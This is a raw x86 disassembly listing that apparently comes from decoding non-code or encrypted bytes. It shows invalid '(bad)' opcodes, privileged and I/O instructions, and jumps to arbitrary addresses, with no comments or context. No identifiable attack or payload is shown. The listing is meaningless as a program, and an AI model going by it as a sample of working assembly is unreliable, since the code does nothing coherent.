  4062e4:	lods   eax,DWORD PTR ds:[esi]
  4062e5:	dec    edi
  4062e6:	(bad)
  4062e9:	pop    esi
  4062ea:	lea    ebx,[ecx+0x6207d9fd]
  4062f0:	xchg   esi,eax
  4062f1:	fcmovu st,st(1)
  4062f3:	mov    edx,0x26ca40a
  4062f8:	aaa    
  4062f9:	test   eax,eax
  4062fb:	sbb    edi,DWORD PTR [ebp+0x28]
  4062fe:	fisubr DWORD PTR [ebx-0x1ac6c6d7]
  406304:	mov    ch,BYTE PTR ds:0x49eae35d
  40630a:	enter  0xa673,0x38
  40630e:	xor    BYTE PTR [edx+0x74b44893],ch
  406314:	push   ebx
  406315:	imul   ebx,DWORD PTR [esi+edi*4-0x39],0xdf33d73d
  40631d:	mov    ds:0x1126b101,al
  406322:	mov    ebp,esp
  406324:	iret   
  406325:	jecxz  0x40632b
  406327:	adc    eax,0x2a781d1b
  40632c:	fs das 
  40632e:	out    dx,al
  40632f:	popf   
  406330:	sbb    eax,0x3cada3e9
  406335:	pop    edi
  406336:	es jl  0x406385
  406339:	mov    bh,BYTE PTR [edi]
  40633b:	pop    edx
  40633c:	mov    ebx,DWORD PTR [eax+0xc40d641]
  406342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406343:	mov    bh,0x87
  406345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406346:	fst    DWORD PTR [edx+0x11da9fe1]
  40634c:	or     al,0x53
  40634e:	cmp    edx,DWORD PTR [ebp+0x68]
  406351:	xchg   DWORD PTR [ebx],ebx
  406353:	and    bh,0x6a
  406356:	mov    edx,0x1d159376
  40635b:	push   esp
  40635c:	xor    eax,DWORD PTR [edx-0x42]
  40635f:	cmp    eax,0xa32b5f26
  406364:	pop    esp
  406365:	mov    edx,0x153d7c90
  40636a:	sbb    BYTE PTR [eax+esi*2],dl
  40636d:	cwde   
  40636e:	adc    BYTE PTR [eax-0x32059a90],bh
  406374:	(bad)
  406377:	and    BYTE PTR [eax],bh
  406379:	rol    ah,1
  40637b:	cmp    eax,0xa981ca00
  406380:	or     eax,0x1a8bf00b
  406385:	inc    edx
  406386:	dec    eax
  406387:	hlt    
  406388:	in     eax,dx
  406389:	cmp    esp,DWORD PTR [ecx-0x7d]
  40638c:	cmp    eax,0x5a78eb2a
  406391:	inc    ecx
  406392:	test   DWORD PTR [eax+0x65b68a83],edi
  406398:	cmp    bl,BYTE PTR [edi+eiz*1-0x426d93a8]
  40639f:	pop    eax
  4063a0:	repnz dec dx
  4063a3:	xor    eax,0xdfc30c28
  4063a8:	inc    eax
  4063a9:	add    DWORD PTR [eax+0x18e535e3],ecx
  4063af:	rol    DWORD PTR [ecx-0x29f4d683],0x8d
  4063b6:	mov    edi,0xa9aa1ee6
  4063bb:	adc    cl,BYTE PTR [ebp+0xc]
  4063be:	(bad)  
  4063bf:	cld    
  4063c0:	scas   eax,DWORD PTR es:[edi]
  4063c1:	(bad)  
  4063c2:	sub    ebx,DWORD PTR [eax-0x40313bf0]
  4063c8:	fstp   DWORD PTR [edi]
  4063ca:	(bad)  
  4063cb:	jb     0x40641e
  4063cd:	dec    al
  4063cf:	imul   DWORD PTR [edx+eiz*4]
  4063d2:	pop    ebx
  4063d3:	mov    ebx,0xe3d7b6d6
  4063d8:	test   DWORD PTR [ebx],edx
  4063da:	sbb    ebx,DWORD PTR [ecx+0x18953cf]
  4063e0:	pop    ds
  4063e1:	cli    
  4063e2:	mov    esp,esp
  4063e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063e5:	shl    bh,cl
  4063e7:	aam    0x12
  4063e9:	jmp    0x4063f0
  4063eb:	or     dl,BYTE PTR [eax+0x44]
  4063ee:	sbb    esp,edx
  4063f0:	dec    ebx
  4063f1:	test   BYTE PTR [ebx-0x1c],bh
  4063f4:	push   edi
  4063f5:	inc    esi
  4063f6:	add    al,0x55
  4063f8:	ror    BYTE PTR [edx],cl
  4063fa:	addr16 fsubp st(1),st
  4063fd:	mov    bh,0x35
  4063ff:	mov    es,WORD PTR ds:0x405d4f80
  406405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406406:	lods   al,BYTE PTR ds:[esi]
  406407:	or     cl,bh
  406409:	cmp    eax,0x668cce46
  40640e:	popf   
  40640f:	aaa    
  406410:	dec    ebx
  406411:	add    ch,BYTE PTR [ebp-0x5]
  406414:	xor    ch,BYTE PTR [edx+0x2d]
  406417:	sbb    ecx,ebp
  406419:	add    BYTE PTR [eax+0x20f58114],0x65
  406420:	out    0x1,al
  406422:	inc    esp
  406423:	int    0xa6
  406425:	sbb    BYTE PTR [edx+ecx*4+0xb],dh
  406429:	test   BYTE PTR [ebx-0x56323111],bl
  40642f:	xchg   esi,eax
  406430:	mov    BYTE PTR [edi],dh
  406432:	pop    edi
  406433:	jmp    0x92e1e6a5
  406438:	sub    esp,DWORD PTR [eax-0x79b307ec]
  40643e:	push   es
  40643f:	jle    0x406471
  406441:	into   
  406442:	inc    ebx
  406443:	and    al,BYTE PTR [eax]
  406445:	adc    ebp,DWORD PTR [edi-0x509d9c86]
  40644b:	in     al,0x98
  40644d:	sub    esi,DWORD PTR [eax-0x54aadfff]
  406453:	mov    dl,ch
  406455:	inc    esp
  406456:	push   eax
  406457:	shl    BYTE PTR [edi+0x67],1
  40645a:	jl     0x40645c
  40645c:	(bad)  
  40645d:	xchg   ecx,eax
  40645e:	cdq    
  40645f:	pop    ecx
  406460:	mov    bh,0x31
  406462:	xor    esp,DWORD PTR [esi+0x2f]
  406465:	mov    ebp,DWORD PTR [edi-0x3909c2e6]
  40646b:	jp     0x4063f3
  40646d:	int    0x5c
  40646f:	xchg   BYTE PTR [edi+edi*2-0x13],al
  406473:	daa    
  406474:	dec    ebx
  406475:	loop   0x406485
  406477:	rcl    DWORD PTR [edx-0x40],1
  40647a:	test   al,0x59
  40647c:	and    cl,BYTE PTR [edi+0x7cb59e65]
  406482:	jno    0x406408
  406484:	cmp    dl,ch
  406486:	and    dh,dl
  406488:	ret    
  406489:	in     al,dx
  40648a:	jo     0x406431
  40648c:	sti    
  40648d:	mov    bh,BYTE PTR [eax]
  40648f:	inc    edx
  406490:	cmp    dl,dl
  406492:	jl     0x406508
  406494:	mov    fs,WORD PTR [edi+0x42]
  406497:	sbb    eax,0x37858b4f
  40649c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40649d:	pop    ecx
  40649e:	mov    eax,0xfd93df98
  4064a3:	sub    ebp,ecx
  4064a5:	sti    
  4064a6:	fsub   st,st(0)
  4064a8:	in     eax,dx
  4064a9:	cmp    BYTE PTR [ebx+esi*4],dh
  4064ac:	jl     0x4064bb
  4064ae:	pushf  
  4064af:	jo     0x4064db
  4064b1:	cmp    ebp,eax
  4064b3:	sti    
  4064b4:	inc    edi
  4064b5:	or     al,0xd6
  4064b7:	xchg   esi,eax
  4064b8:	pop    ds
  4064b9:	jl     0x4064c3
  4064bb:	push   0xffffff9b
  4064bd:	mov    ah,0xc6
  4064bf:	mov    esp,ebp
  4064c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064c2:	jae    0x406503
  4064c4:	fwait
  4064c5:	icebp  
  4064c6:	(bad)  
  4064c8:	(bad)  
  4064c9:	cld    
  4064ca:	loopne 0x406503
  4064cc:	or     ch,dh
  4064ce:	test   BYTE PTR [ecx-0x36],0xe1
  4064d2:	bound  esi,QWORD PTR [ecx-0x14]
  4064d5:	sub    eax,edx
  4064d7:	hlt    
  4064d8:	add    eax,0x57ebe1f7
  4064dd:	int    0x49
  4064df:	xlat   BYTE PTR ds:[ebx]
  4064e0:	int    0x77
  4064e2:	jb     0x406542
  4064e4:	xchg   ebx,eax
  4064e5:	daa    
  4064e6:	ins    BYTE PTR es:[edi],dx
  4064e7:	xchg   BYTE PTR [edi+ebx*1+0x69],cl
  4064eb:	inc    eax
  4064ec:	div    DWORD PTR [eax]
  4064ee:	ror    BYTE PTR [edx-0xdfe352],0xa6
  4064f5:	sbb    DWORD PTR [eax-0x41d807c2],esi
  4064fb:	push   ss
  4064fc:	cmp    al,0x49
  4064fe:	in     al,0x5d
  406500:	call   0x5d49d296
  406505:	adc    BYTE PTR [ebp+0x61],0x29
  406509:	jb     0x40656a
  40650b:	in     eax,0x94
  40650d:	xor    ah,BYTE PTR [esi]
  40650f:	stc    
  406510:	and    bl,BYTE PTR [eax-0x75]
  406513:	mov    cl,0x96
  406515:	icebp  
  406516:	shl    BYTE PTR [eax-0x79],cl
  406519:	mov    eax,ds:0xed195cf9
  40651e:	push   0x7ea0ab31
  406523:	test   BYTE PTR [ecx-0x24d60e90],bl
  406529:	jmp    0x9a0e866f
  40652e:	xchg   BYTE PTR [ebx],ch
  406530:	mov    edx,0xdcca6747
  406535:	dec    edi
  406536:	dec    ebx
  406537:	mov    DWORD PTR [esi-0x2bca51ee],eax
  40653d:	stc    
  40653e:	mov    bl,0xd0
  406540:	jmp    0x8fc2:0x182003b9
  406547:	test   DWORD PTR [ecx],ebp
  406549:	sti    
  40654a:	aaa    
  40654b:	js     0x40659f
  40654d:	pop    esi
  40654e:	push   edi
  40654f:	data16 or ch,BYTE PTR [esi-0x57f2f5d8]
  406556:	sub    edx,DWORD PTR [eax+eax*4]
  406559:	scas   al,BYTE PTR es:[edi]
  40655a:	in     eax,dx
  40655b:	repnz mov gs,WORD PTR [edi+0x75]
  40655f:	dec    esi
  406560:	lods   al,BYTE PTR ds:[esi]
  406561:	cs das 
  406563:	imul   eax,DWORD PTR [eax+0x4aff476d],0x39
  40656a:	shl    BYTE PTR [ecx-0x7c],1
  40656d:	jbe    0x406521
  40656f:	sbb    al,0x22
  406571:	ss jge 0x406597
  406574:	hlt    
  406575:	arpl   dx,bx
  406577:	push   ss
  406578:	aad    0xf9
  40657a:	enter  0x7f24,0xc3
  40657e:	dec    ebp
  40657f:	inc    ecx
  406580:	std    
  406581:	add    DWORD PTR [ebx+0x316e2090],0xd
  406588:	lods   eax,DWORD PTR ds:[esi]
  406589:	in     al,dx
  40658a:	mov    ebp,0xaf2385aa
  40658f:	push   ebx
  406590:	inc    eax
  406591:	xchg   DWORD PTR [edx+edi*2+0x622e0b7],eax
  406598:	adc    eax,0x3c0d7282
  40659d:	adc    DWORD PTR [eax-0x52],ebp
  4065a0:	retf   
  4065a1:	mov    ch,0xa5
  4065a3:	cmc    
  4065a4:	adc    BYTE PTR [edx],dh
  4065a6:	sub    ecx,DWORD PTR ds:0xcb5cbe4e
  4065ac:	sbb    cl,BYTE PTR [eax+0x3a]
  4065af:	shr    BYTE PTR [esi-0xe6b40f9],0xf9
  4065b6:	xor    cl,BYTE PTR [edi-0x246e1a74]
  4065bc:	mov    dh,dh
  4065be:	sub    eax,0x8a22db82
  4065c3:	or     ecx,DWORD PTR [ebx]
  4065c5:	jbe    0x4065ce
  4065c7:	mov    eax,0x60017bbe
  4065cc:	ret    
  4065cd:	jmp    0x8548:0xcda58132
  4065d4:	in     al,0xbc
  4065d6:	je     0x406614
  4065d8:	fist   DWORD PTR [ecx]
  4065da:	jmp    0xb6b99dfb
  4065df:	imul   eax,DWORD PTR [edx+0x501e936c],0x2ed99cf3
  4065e9:	or     ecx,edx
  4065eb:	popf   
  4065ec:	div    BYTE PTR ds:0xf00ab583
  4065f2:	xor    eax,0xc56b640c
  4065f7:	arpl   WORD PTR [edi+0x37],di
  4065fa:	ret    0xa05
  4065fd:	pop    edx
  4065fe:	lea    ebp,[ecx-0x28]
  406601:	sub    BYTE PTR [esi+0x5e],dh
  406604:	xchg   esp,eax
  406605:	mov    BYTE PTR [eax-0x4e],dh
  406608:	hlt    
  406609:	push   ecx
  40660a:	div    ecx
  40660c:	inc    ecx
  40660d:	popf   
  40660e:	and    BYTE PTR [ebx+0x3d06721e],0xd5
  406615:	retf   0xe93b
  406618:	push   esi
  406619:	dec    BYTE PTR [edx]
  40661b:	sbb    al,BYTE PTR [eax]
  40661d:	into   
  40661e:	call   0xaf858620
  406623:	jnp    0x40664b
  406625:	call   0x8c61e11e
  40662a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40662c:	jge    0x4065de
  40662e:	push   esi
  40662f:	fsub   QWORD PTR [ebp+0x2c]
  406632:	pop    edx
  406633:	js     0x406606
  406635:	fsubr  QWORD PTR [edx-0x5dde1f31]
  40663b:	push   ebx
  40663c:	cmp    al,0x4b
  40663e:	or     BYTE PTR [edx-0xf],al
  406641:	cmp    al,0x7a
  406643:	iret   
  406644:	add    DWORD PTR [eax-0x3d],edi
  406647:	lods   al,BYTE PTR ds:[esi]
  406648:	mov    dh,bh
  40664a:	sbb    ch,BYTE PTR [edx]
  40664c:	add    esp,esp
  40664e:	mov    ebp,0xe9c5f9ce
  406653:	mov    al,ds:0x81d6af8b
  406658:	out    0x52,eax
  40665a:	outs   dx,DWORD PTR ss:[esi]
  40665c:	enter  0x69b7,0xf9
  406660:	stc    
  406661:	ds push edx
  406663:	shr    eax,1
  406665:	sbb    eax,0xf63b9373
  40666a:	sub    BYTE PTR [edi],bh
  40666c:	fisub  WORD PTR [ebp+0x5a]
  40666f:	jl     0x406680
  406671:	mov    ebx,0x5f000886
  406676:	daa    
  406677:	in     al,0x19
  406679:	adc    esp,ebx
  40667b:	xchg   ebx,eax
  40667c:	mov    eax,0x1eae4d1a
  406681:	bound  esp,QWORD PTR [eax-0x65b7b86a]
  406687:	in     eax,0x84
  406689:	pop    eax
  40668a:	sbb    edi,DWORD PTR [ecx-0x7f]
  40668d:	xor    dh,BYTE PTR [eax]
  40668f:	mov    bh,0xec
  406691:	pop    ds
  406692:	push   ecx
  406693:	add    al,0xff
  406695:	mov    al,ds:0x7ebf7d68
  40669a:	jo     0x4066ff
  40669c:	cmp    BYTE PTR [eax+0x3dffe50d],dl
  4066a2:	jge    0x406695
  4066a4:	popa   
  4066a5:	ja     0x4066bb
  4066a7:	mul    DWORD PTR [eax+0x5b9cb0a4]
  4066ad:	mov    edi,esp
  4066af:	pop    ss
  4066b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b1:	rcl    DWORD PTR [ecx-0x42],1
  4066b4:	mov    cl,0x7c
  4066b6:	call   0x5ae4:0x25861415
  4066bd:	sub    ecx,esp
  4066bf:	inc    eax
  4066c0:	call   0x3cb40272
  4066c5:	cwde   
  4066c6:	dec    edx
  4066c7:	mov    ch,0x4f
  4066c9:	dec    edx
  4066ca:	or     DWORD PTR [esi],edi
  4066cc:	aaa    
  4066cd:	inc    esi
  4066ce:	or     BYTE PTR [ecx+0x162aba0e],bl
  4066d4:	jb     0x406695
  4066d6:	lds    esp,FWORD PTR [ebx+eax*8]
  4066d9:	push   ecx
  4066da:	lods   al,BYTE PTR ds:[esi]
  4066db:	xor    DWORD PTR [ecx],ebp
  4066dd:	jae    0x4066ca
  4066df:	iret   
  4066e0:	repnz dec ecx
  4066e2:	jae    0x406714
  4066e4:	jecxz  0x40670e
  4066e6:	mov    ebx,0xea4515e3
  4066eb:	or     DWORD PTR [ecx+0x65],0xffffffd1
  4066ef:	add    BYTE PTR [eax+eiz*2],ah
  4066f2:	hlt    
  4066f3:	cmc    
  4066f4:	push   0xffffff8e
  4066f6:	fst    st(1)
  4066f8:	dec    ebx
  4066f9:	test   al,0xf4
  4066fb:	nop
  4066fc:	(bad)  
  4066fd:	sbb    bl,BYTE PTR [ebx]
  4066ff:	bound  edi,QWORD PTR [edi+0x1a]
  406702:	je     0x406763
  406704:	mov    ss,WORD PTR [ebp-0x2a7e7cc6]
  40670a:	and    al,0x9e
  40670c:	out    0x96,al
  40670e:	sbb    DWORD PTR [edi+0x311d5faf],esp
  406714:	addr16 push esp
  406716:	icebp  
  406717:	(bad)  
  406718:	aad    0x91
  40671a:	fadd   DWORD PTR [edi]
  40671c:	and    eax,0xbb165b77
  406721:	push   ds
  406722:	jge    0x4066e5
  406724:	and    ah,BYTE PTR [esi+0x59]
  406727:	lahf   
  406728:	xlat   BYTE PTR ds:[ebx]
  406729:	in     eax,dx
  40672a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40672b:	test   DWORD PTR [edx+0x3],esi
  40672e:	jecxz  0x4067a7
  406730:	and    eax,0x6866475
  406735:	mov    ds:0x265b1bc0,al
  40673a:	add    eax,0x2a459268
  40673f:	adc    eax,0xc07785c7
  406744:	in     al,dx
  406745:	push   eax
  406746:	inc    ecx
  406747:	stc    
  406748:	dec    ebp
  406749:	call   0x204e:0x6672a7f0
  406750:	mov    ds:0x57c8d2a1,eax
  406755:	inc    ecx
  406756:	mov    ebp,0xa84ce026
  40675b:	cwde   
  40675c:	mov    cl,0xa0
  40675e:	jae    0x406758
  406760:	adc    esi,edi
  406762:	dec    ecx
  406763:	sahf   
  406764:	ins    BYTE PTR es:[edi],dx
  406765:	xchg   esi,eax
  406766:	add    al,0xa3
  406768:	pop    ds
  406769:	std    
  40676a:	or     dh,ch
  40676c:	and    al,0x60
  40676e:	xchg   ecx,eax
  40676f:	cld    
  406770:	inc    edx
  406771:	in     eax,0x82
  406773:	sub    ecx,DWORD PTR [ebx-0x8]
  406776:	sub    ebp,DWORD PTR [esi]
  406778:	mov    ebx,0x5ee9972a
  40677d:	leave  
  40677e:	stc    
  40677f:	mov    ebx,0xc63ccbd7
  406784:	push   eax
  406785:	push   edx
  406786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406787:	retf   
  406788:	idiv   DWORD PTR [edi]
  40678a:	pushf  
  40678b:	ret    0xc0d9
  40678e:	cmp    ebp,DWORD PTR [ebx+0x118e5f9d]
  406794:	sar    BYTE PTR [edi+0x3f],1
  406797:	aad    0xb2
  406799:	and    dh,ch
  40679b:	repnz mov cl,0xba
  40679e:	lahf   
  40679f:	mov    ecx,0xd1e1b569
  4067a4:	add    DWORD PTR [ebx+0x6a6cddff],edi
  4067aa:	nop
  4067ab:	push   cs
  4067ac:	cli    
  4067ad:	aas    
  4067ae:	jno    0x4067b7
  4067b0:	push   edi
  4067b1:	push   edi
  4067b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067b3:	in     eax,dx
  4067b4:	adc    esp,DWORD PTR [ebx+0x5e]
  4067b7:	pusha  
  4067b8:	push   0xfffffff2
  4067ba:	jle    0x40681c
  4067bc:	(bad)  
  4067bd:	outs   dx,DWORD PTR ds:[esi]
  4067be:	inc    eax
  4067bf:	not    dh
  4067c1:	mul    BYTE PTR [edx]
  4067c3:	pop    esi
  4067c4:	add    eax,0xa9acbee7
  4067c9:	in     al,0x23
  4067cb:	sub    bh,BYTE PTR ds:0xddf216ef
  4067d1:	int    0x7b
  4067d3:	or     DWORD PTR [ecx-0x62],esp
  4067d6:	(bad)  
  4067d7:	mov    esp,0x169df89f
  4067dc:	retf   
  4067dd:	cs mov ebp,0x71879053
  4067e3:	nop
  4067e4:	es popf 
  4067e6:	mov    ?,WORD PTR [ecx]
  4067e8:	dec    esp
  4067e9:	dec    eax
  4067ea:	mov    dl,0x9
  4067ec:	ds clc 
  4067ee:	(bad)  
  4067ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067f0:	jo     0x406778
  4067f2:	jbe    0x406866
  4067f4:	jo     0x4067cd
  4067f6:	mov    ebp,DWORD PTR [esi-0x4b2589a6]
  4067fc:	mov    ch,0x59
  4067fe:	shl    DWORD PTR [edi],1
  406800:	imul   eax,DWORD PTR [ecx-0x45],0xd0432cf6
  406807:	xor    esp,DWORD PTR [eax]
  406809:	xchg   DWORD PTR [ebp+0x8b8daf1],ebp
  40680f:	dec    ebp
  406810:	xchg   DWORD PTR [esi+0x44],ebp
  406813:	dec    esi
  406814:	jae    0x406864
  406816:	neg    DWORD PTR [ebx-0x61]
  406819:	and    al,0x54
  40681b:	leave  
  40681c:	mov    edi,ss
  40681e:	mov    dh,ah
  406820:	sub    eax,0x197ac881
  406825:	imul   DWORD PTR [esi-0x2f]
  406828:	sbb    eax,0x5ae771f8
  40682d:	xchg   ecx,eax
  40682e:	and    al,0xb5
  406830:	mov    eax,0x4bfdda9b
  406835:	inc    esp
  406836:	pop    ecx
  406837:	adc    ebx,edi
  406839:	inc    ecx
  40683a:	mov    esi,0xf7ff6b7d
  40683f:	xor    al,0x8e
  406841:	dec    ebx
  406842:	imul   esp,DWORD PTR [edi+0x54],0x7f62957f
  406849:	pusha  
  40684a:	lds    ebp,FWORD PTR [ecx]
  40684c:	xor    ecx,ebp
  40684e:	fst    QWORD PTR [eax-0x286b40a3]
  406854:	ret    0x19eb
  406857:	sahf   
  406858:	dec    ebp
  406859:	cmp    ch,ch
  40685b:	push   0xa90c5cbe
  406860:	int3   
  406861:	mov    dl,0x69
  406863:	add    eax,ecx
  406865:	pusha  
  406866:	cs push cs
  406868:	cwde   
  406869:	jns    0x406834
  40686b:	mov    bh,0xfa
  40686d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40686e:	push   es
  40686f:	mov    ch,0x33
  406871:	add    DWORD PTR [edx+0xdd9765c],edx
  406877:	ror    DWORD PTR [edi-0x2604f048],0x2c
  40687e:	or     BYTE PTR [edx+0x72],ah
  406881:	neg    DWORD PTR [esi+0x3b]
  406884:	push   edx
  406885:	mov    edi,0xfc2ee335
  40688a:	idiv   BYTE PTR [ebp+ecx*1+0x6b]
  40688e:	jmp    0x31c28d74
  406893:	or     esp,DWORD PTR [edi]
  406895:	xchg   ebx,ecx
  406897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406898:	xchg   edi,eax
  406899:	mov    BYTE PTR ss:[ebx],al
  40689c:	daa    
  40689d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40689e:	push   esi
  40689f:	adc    eax,0xc36c35fa
  4068a4:	mov    ecx,0xd0a87154
  4068a9:	mov    eax,0xbee7a949
  4068ae:	xor    DWORD PTR [ebp+0x31eafb1e],ebx
  4068b4:	xor    BYTE PTR cs:[ecx],0x3d
  4068b8:	clc    
  4068b9:	test   DWORD PTR [ebp-0x5a3ca54c],ecx
  4068bf:	xor    DWORD PTR [ecx+0x51],0xc2370d04
  4068c6:	js     0x406918
  4068c8:	lods   eax,DWORD PTR ds:[esi]
  4068c9:	dec    ebp
  4068ca:	clc    
  4068cb:	sbb    DWORD PTR [esp+eax*1-0x42],esp
  4068cf:	pop    esp
  4068d0:	leave  
  4068d1:	sub    ch,bh
  4068d3:	xor    BYTE PTR [eax],bl
  4068d5:	test   bh,ch
  4068d7:	ins    DWORD PTR es:[edi],dx
  4068d8:	pop    edi
  4068d9:	shr    BYTE PTR [eax],cl
  4068db:	or     DWORD PTR [edx],ebp
  4068dd:	(bad)  
  4068de:	fdivr  DWORD PTR [esi]
  4068e0:	pop    edx
  4068e1:	jle    0x4068d1
  4068e3:	in     eax,dx
  4068e4:	sti    
  4068e5:	xor    DWORD PTR [eax-0x43],edi
  4068e8:	and    DWORD PTR [ecx-0x4946eaf0],0x12df5c9e
  4068f2:	dec    esp
  4068f3:	(bad)  
  4068f4:	jp     0x406885
  4068f6:	stos   DWORD PTR es:[edi],eax
  4068f7:	out    0x25,eax
  4068f9:	sub    eax,0xb29854c5
  4068fe:	mov    ebp,0xaf8a8cd
  406903:	test   eax,0xefa7d52b
  406908:	mov    esp,0x42deda85
  40690d:	jnp    0x40692f
  40690f:	pop    ecx
  406910:	xchg   DWORD PTR [edx],ebp
  406912:	inc    DWORD PTR [edx+0x58]
  406915:	pop    ebp
  406916:	mov    ah,0x35
  406918:	jmp    0x1fb48363
  40691d:	fbstp  TBYTE PTR [ebx]
  40691f:	mov    DWORD PTR [esi-0x32961c9d],esp
  406925:	ds ret 0xffbf
  406929:	lahf   
  40692a:	out    dx,eax
  40692b:	adc    eax,0xa135b20d
  406930:	mov    BYTE PTR [edi+0x56c21b1b],bh
  406936:	xchg   ebx,eax
  406937:	jmp    0x406900
  406939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40693a:	sub    eax,edi
  40693c:	aam    0x5a
  40693e:	cwde   
  40693f:	inc    ebp
  406940:	adc    bl,BYTE PTR [edi+0x5d]
  406943:	sbb    BYTE PTR [edx],ah
  406945:	pop    edi
  406946:	imul   esi,DWORD PTR [esi],0x99596ccf
  40694c:	pop    ss
  40694d:	popa   
  40694e:	sub    al,0x97
  406950:	sub    ah,BYTE PTR [ebp-0xaee9a7a]
  406956:	je     0x406914
  406958:	push   0x2d70eebd
  40695d:	inc    esp
  40695e:	loop   0x4069a5
  406960:	int3   
  406961:	daa    
  406962:	enter  0x37ca,0x95
  406966:	pop    eax
  406967:	push   0xf7f2da22
  40696c:	mul    BYTE PTR [eax+0x17]
  40696f:	push   es
  406970:	sbb    eax,ebx
  406972:	adc    al,0x2f
  406974:	test   al,0xf2
  406976:	or     al,0xf
  406978:	dec    edi
  406979:	ret    0x4551
  40697c:	repnz jmp 0x772a:0x88bbc5a7
  406984:	adc    al,dh
  406986:	dec    ebx
  406987:	adc    esp,DWORD PTR [ebp+0x3a]
  40698a:	fadd   DWORD PTR [ecx]
  40698c:	out    0x25,eax
  40698e:	lds    ebp,FWORD PTR [eax+edi*8-0x3784566]
  406995:	and    bl,BYTE PTR [ecx]
  406997:	stos   BYTE PTR es:[edi],al
  406998:	retf   
  406999:	mov    bh,0xb4
  40699b:	mov    edi,DWORD PTR [ebp+0x4b053a4c]
  4069a1:	xor    eax,DWORD PTR [edi-0x1987280e]
  4069a7:	test   BYTE PTR [edi+0x7e8479c8],al
  4069ad:	nop
  4069ae:	or     BYTE PTR [edx-0x13],al
  4069b1:	jno    0x406a04
  4069b3:	sbb    esp,edi
  4069b5:	inc    edi
  4069b6:	mov    ah,0xa1
  4069b8:	xchg   esp,eax
  4069b9:	outs   dx,BYTE PTR ds:[esi]
  4069ba:	div    BYTE PTR [ebx+0x41]
  4069bd:	das    
  4069be:	inc    ebx
  4069bf:	pop    ss
  4069c0:	adc    DWORD PTR [edx+0x18],ecx
  4069c3:	xchg   edi,eax
  4069c4:	sbb    eax,eax
  4069c6:	sbb    DWORD PTR [ebx-0x8e8588d],esp
  4069cc:	mov    ah,0x82
  4069ce:	ja     0x406964
  4069d0:	retf   
  4069d1:	rcr    bh,1
  4069d3:	out    dx,eax
  4069d4:	jg     0x406a54
  4069d6:	xlat   BYTE PTR ds:[ebx]
  4069d7:	or     ecx,DWORD PTR [ebx]
  4069d9:	sti    
  4069da:	pop    esp
  4069db:	ret    0x2ebb
  4069de:	cmp    BYTE PTR [edi+0xf],cl
  4069e1:	sti    
  4069e2:	xchg   esp,eax
  4069e3:	dec    esp
  4069e4:	sub    ebx,DWORD PTR [esi-0x7d7613d7]
  4069ea:	fist   DWORD PTR [edx-0x2242d6f4]
  4069f0:	outs   dx,BYTE PTR ds:[esi]
  4069f1:	jl     0x40697d
  4069f3:	add    BYTE PTR [eax],ch
  4069f5:	outs   dx,BYTE PTR ds:[esi]
  4069f6:	add    dh,BYTE PTR [ebp+0x22]
  4069f9:	jge    0x406a70
  4069fb:	mov    ds:0x6814b99d,al
  406a00:	xchg   BYTE PTR ds:0x80d53462,cl
  406a06:	nop
  406a07:	jge    0x4069fd
  406a09:	sub    al,0xd4
  406a0b:	(bad)  
  406a0c:	pop    ebx
  406a0d:	loop   0x406a21
  406a0f:	ins    BYTE PTR es:[edi],dx
  406a10:	(bad)  
  406a11:	mov    dh,0x65
  406a13:	mov    al,0xd3
  406a15:	imul   esp,DWORD PTR [ecx+ebx*2+0x17a00e37],0x602d78d7
  406a20:	ja     0x4069cd
  406a22:	and    BYTE PTR [ebx],ah
  406a24:	or     BYTE PTR ds:0x603622f9,ch
  406a2a:	cmp    edx,DWORD PTR [eax]
  406a2c:	push   edi
  406a2d:	push   0xfc99e7b
  406a32:	push   0xffffffea
  406a34:	inc    edi
  406a35:	mov    al,ds:0xc382e511
  406a3a:	(bad)  
  406a3b:	jmp    0x406a32
  406a3d:	in     eax,dx
  406a3e:	sub    DWORD PTR [ecx],eax
  406a40:	idiv   BYTE PTR [ebx]
  406a42:	(bad)  
  406a43:	dec    DWORD PTR [edi+0x9]
  406a46:	aam    0xfa
  406a48:	jns    0x4069de
  406a4a:	pop    ebx
  406a4b:	adc    BYTE PTR [eax],ah
  406a4d:	mov    cl,0xcc
  406a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a50:	bound  edx,QWORD PTR [ecx+0x30]
  406a53:	jae    0x406a29
  406a55:	into   
  406a56:	imul   edi,ecx,0x5
  406a59:	jns    0x406a9a
  406a5b:	sbb    BYTE PTR [ecx+0x3c3d8fb],al
  406a61:	test   DWORD PTR [edx-0x6053a67c],ecx
  406a67:	xchg   edi,eax
  406a68:	xchg   DWORD PTR [bp+di],ebx
  406a6b:	iret   
  406a6c:	fnstcw WORD PTR [ebp+ecx*8+0x21935948]
  406a73:	pop    esp
  406a74:	cmp    ebp,DWORD PTR [ebp-0x326a25b1]
  406a7a:	jbe    0x406a77
  406a7c:	xor    al,0x18
  406a7e:	cmp    ebp,DWORD PTR ds:0x2e9403d8
  406a84:	adc    edx,esp
  406a86:	rcr    DWORD PTR [edi],1
  406a88:	or     DWORD PTR [ecx+0x76],esp
  406a8b:	or     al,0x80
  406a8d:	rcl    DWORD PTR [ebx],0xb1
  406a90:	repnz aas 
  406a92:	ja     0x406afd
  406a94:	pop    eax
  406a95:	mov    ebx,0x1198c494
  406a9a:	sbb    dh,BYTE PTR [ecx]
  406a9c:	mov    cl,0xa3
  406a9e:	cmp    DWORD PTR [ecx-0x57],esi
  406aa1:	dec    ebp
  406aa2:	(bad)  
  406aa3:	xchg   esp,eax
  406aa4:	popf   
  406aa5:	add    al,BYTE PTR ds:0x6c168130
  406aab:	sahf   
  406aac:	(bad)  
